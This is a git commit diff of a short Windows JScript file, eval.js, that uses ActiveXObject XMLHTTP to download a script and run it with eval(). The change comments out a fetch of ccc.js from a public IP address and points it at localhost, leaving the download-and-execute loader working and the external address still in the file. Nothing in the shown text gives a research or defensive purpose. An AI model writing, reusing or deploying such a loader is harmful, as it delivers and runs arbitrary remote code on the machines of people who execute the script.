475d7e2f402bbededdd9778e184e5470c595cc3d
J1g <57854251+J1ggr@users.noreply.github.com>
2025-10-27 18:10:26 +0800

    Update eval.js

--- eval.js
+++ eval.js
@@ -1,5 +1,6 @@
 var xml=new ActiveXObject("Microsoft.XMLHTTP");
-xml.open("GET","http://121.40.101.79/ccc.js",false);
+//xml.open("GET","http://121.40.101.79/ccc.js",false);
+xml.open("GET","http://127.0.0.1/ccc.js",false);
 xml.send();
 var aaa=xml.responseText;
 eval(aaa);
